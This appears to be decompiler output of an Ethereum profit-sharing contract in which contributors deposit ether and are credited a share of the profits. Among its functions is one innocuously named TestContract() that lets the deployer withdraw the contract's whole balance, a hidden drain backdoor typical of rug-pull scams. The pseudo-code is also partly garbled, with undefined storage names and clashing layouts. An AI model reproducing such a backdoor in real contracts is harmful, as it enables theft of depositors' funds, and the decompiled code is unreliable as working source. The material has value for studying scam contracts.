contract main {


// =======================  Init code  ======================


uint256 stor1;
uint256 stor2;
uint256 stor3;
uint256 stor4;
uint256 stor5;
uint256 stor6;
address stor7;

function _fallback() payable {
    stor1 = 0
    stor2 = 0
    stor3 = 0
    stor4 = 0
    stor5 = 0
    stor6 = msg.sender or Mask(96, 160, stor6)
    stor7 = msg.sender
    return code.data[90 len 1602]
}



// =====================  Runtime code  =====================


array of struct stor0;
array of uint256 stor1;
array of uint256 stor2;
uint256 totalContributions;
uint256 totalProfit;
uint256 totalSUM;
address deployerAddress;
address profitAddr;
uint256 stor7;
array of uint256 stor38971441815954291753963644440956123609054264817261647753096923611481829733346;
array of address stor38971441815954291753963644440956123609054264817261647753096923611481829733349;
array of uint256 stor38971441815954291753963644440956123609054264817261647753096923611481829733351;
array of uint256 stor44851508847536754802816858523428556429728131226063707645725629049383668347874;
array of uint256 stor44851508847536754802816858523428556429728131226063707645725629049383668347877;

function totalContributions() payable {
    return totalContributions
}

function totalSUM() payable {
    return totalSUM
}

function totalProfit() payable {
    return totalProfit
}

function profitAddr() payable {
    return address(profitAddr)
}

function unprocessedProfits() payable {
    return stor1.length
}

function deployer() payable {
    return deployerAddress
}

function totalContributors() payable {
    return stor2.length
}

function SetProfitAddr(address arg1) payable {
    if msg.sender == deployerAddress:
        uint256(stor7) = arg1 or Mask(96, 160, uint256(stor7))
}

function contributors(uint256 arg1) payable {
    require arg1 < stor0.length
    return stor5629[arg1], uint256(stor[(3 * arg1) + code.data[1570 len 32]]), stor6329[arg1]
}

function TestContract() payable {
    if msg.sender == deployerAddress:
        call deployerAddress with:
           value eth.balance(this.address) wei
             gas 0 wei
}

function PayOut(uint256 arg1) payable {
    require arg1 < stor0.length
    if msg.sender == stor5629[arg1]:
        require arg1 < stor0.length
        if stor6329[arg1]:
            require arg1 < stor0.length
            call stor5629[arg1] with:
               value stor6329[arg1] wei
                 gas 0 wei
            stor0[arg1] = 0
            totalProfit -= stor6329[arg1]
            totalSUM -= stor6329[arg1]
}

function Enter() payable {
    if msg.sender == address(profitAddr):
        stor1.length = msg.value
    else:
        if stor1.length != 0:
            totalProfit += stor1.length
            if stor0.length != 0:
                if stor1.length != 0:
                    idx = 0
                    s = 0
                    s = 0
                    while idx < stor0.length:
                        mem[0] = 0
                        stor6329[idx] += (stor5629[idx] * stor1.length) + (uint256(stor[code.data[1570 len 32] + (3 * idx)]) * stor1.length) / totalSUM
                        idx = idx + 1
                        s = stor5629[idx] + uint256(stor[code.data[1570 len 32] + (3 * idx)])
                        s = (stor5629[idx] * stor1.length) + (uint256(stor[code.data[1570 len 32] + (3 * idx)]) * stor1.length) / totalSUM
                        continue 
            totalSUM += stor1.length
        totalContributions += msg.value
        totalSUM += msg.value
        idx = 0
        while idx < stor0.length:
            mem[0] = 0
            if stor5629[idx] != msg.sender:
                idx = idx + 1
                continue 
            require idx < stor0.length
            uint256(stor[code.data[1570 len 32] + (3 * idx)]) += msg.value
        stor2.length = stor0.length + 1
        stor0.length++
        if not stor0.length <= stor0.length + 1:
            idx = (3 * stor0.length) + 0x56290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e8
            while (3 * stor0.length) + 0x56290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e5 > idx:
                address(stor[idx]) = 0
                stor1[idx] = 0
                stor2[idx] = 0
                idx = idx + 1
                continue 
        require stor0.length - 1 < stor0.length
        stor5629[stor0.length] = msg.sender or Mask(96, 160, stor5629[stor0.length])
        uint256(stor[code.data[1570 len 32] + (3 * stor0.length) - 3]) = msg.value
        stor6329[stor0.length] = 0
}

function _fallback() payable {
    if msg.sender == address(profitAddr):
        stor1.length = msg.value
    else:
        if stor1.length != 0:
            totalProfit += stor1.length
            if stor0.length != 0:
                if stor1.length != 0:
                    idx = 0
                    s = 0
                    s = 0
                    while idx < stor0.length:
                        mem[0] = 0
                        stor6329[idx] += (stor5629[idx] * stor1.length) + (uint256(stor[code.data[1570 len 32] + (3 * idx)]) * stor1.length) / totalSUM
                        idx = idx + 1
                        s = stor5629[idx] + uint256(stor[code.data[1570 len 32] + (3 * idx)])
                        s = (stor5629[idx] * stor1.length) + (uint256(stor[code.data[1570 len 32] + (3 * idx)]) * stor1.length) / totalSUM
                        continue 
            totalSUM += stor1.length
        totalContributions += msg.value
        totalSUM += msg.value
        idx = 0
        while idx < stor0.length:
            mem[0] = 0
            if stor5629[idx] != msg.sender:
                idx = idx + 1
                continue 
            require idx < stor0.length
            uint256(stor[code.data[1570 len 32] + (3 * idx)]) += msg.value
        stor2.length = stor0.length + 1
        stor0.length++
        if not stor0.length <= stor0.length + 1:
            idx = (3 * stor0.length) + 0x56290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e8
            while (3 * stor0.length) + 0x56290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e5 > idx:
                address(stor[idx]) = 0
                stor1[idx] = 0
                stor2[idx] = 0
                idx = idx + 1
                continue 
        require stor0.length - 1 < stor0.length
        stor5629[stor0.length] = msg.sender or Mask(96, 160, stor5629[stor0.length])
        uint256(stor[code.data[1570 len 32] + (3 * stor0.length) - 3]) = msg.value
        stor6329[stor0.length] = 0
}



}
